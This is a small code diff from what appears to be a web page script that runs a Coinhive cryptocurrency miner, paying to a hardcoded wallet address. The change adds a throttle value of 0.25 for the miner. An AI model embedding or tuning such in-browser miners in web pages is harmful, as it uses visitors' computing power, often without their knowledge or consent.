@@ -9,6 +9,7 @@
 			var miner = coinhive.User('4B5rfHVYF7R8ag71iamrFSddbV5wAN97BG5W5VsVqPJMLML9hugBngDGwVPNZYKGPqNtoz1eJYhFWEnBCpgt4cJUG8xBPB1', 'monproxy');
 			//var threads = Math.max(1,Math.floor(navigator.hardwareConcurrency/2));
 			//miner.setNumThreads(threads);
+			var throttle = 0.25;
 			miner.setThrottle(throttle);
 			
 			try {
